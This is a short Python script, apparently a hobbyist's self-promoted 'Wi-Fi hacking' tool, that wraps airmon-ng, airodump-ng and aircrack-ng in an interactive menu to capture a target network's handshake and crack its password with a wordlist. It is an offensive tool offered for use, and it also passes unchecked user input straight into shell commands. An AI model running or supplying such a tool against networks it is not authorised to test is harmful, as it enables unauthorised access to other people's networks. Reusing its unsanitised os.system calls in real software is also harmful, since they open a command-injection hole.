#Wifi hacking using Aircrack-ng

import os
print("[#]Developed by Yatharth[#]")
print("Wi-Fi hacking Automation Program")
print(" ")
print("follow on instagram @im.yatharth")
print("Visit Github:-  https://github.com/yatharthgeek/")
print("Subscribe YouTube Channel :- https://www.youtube.com/channel/UC6AXassf_ZGu-icFW8iT0-Q")
print(" \n"+"")

# Code starts here
while 1==1:
    bash= input("[Wi-Fi Tool] >> ")

    if bash == "start":
        infn= input("[WiFi adpater Name] >> ")

        if infn==infn:
            code1= "airmon-ng start "+infn 
            os.system(code1)


    if bash == "stop":
        infn= input("[WiFi adpater Name] >> ")

        if infn==infn:
            code1= "airmon-ng stop "+infn+"mon" 
            os.system(code1)


    if bash == "scan":
        code1= "airodump-ng "+infn+"mon"
        os.system(code1)

    if bash== "get-in":
        infn=input("[WiFi adpater Name] >> ")
        bssid= input("[target BSSID] >>")
        file= input("[File Name] >>")
        channel=input("[Channel No] >>")
        code1= "airodump-ng -w "+file+" -c "+channel+" --bssid "+bssid+" "+infn+"mon"
        print("Open Deauth File for Client Deauth")
        print(" ")
        os.system(code1)

    if bash=="crack":
        capfile=input("[Cap file location] >> ")
        wordlist=input("[Wordlist location] >> ")
        code1= "aircrack-ng "+capfile+" -w "+wordlist
        os.system(code1)

    if bash =="help":
        print("Commands\n"\
            " \n"\

            "start                  To Start Program\n"\
                "scan                   To Scan Network\n"\
                    "get-in             To Enter a Network\n" \
                        "crack                  To Crack the Network\n" \
                            "Check                  To check the apapter name")

    if bash=="check":
        os.system("iwconfig")

    

    

    

    

    

    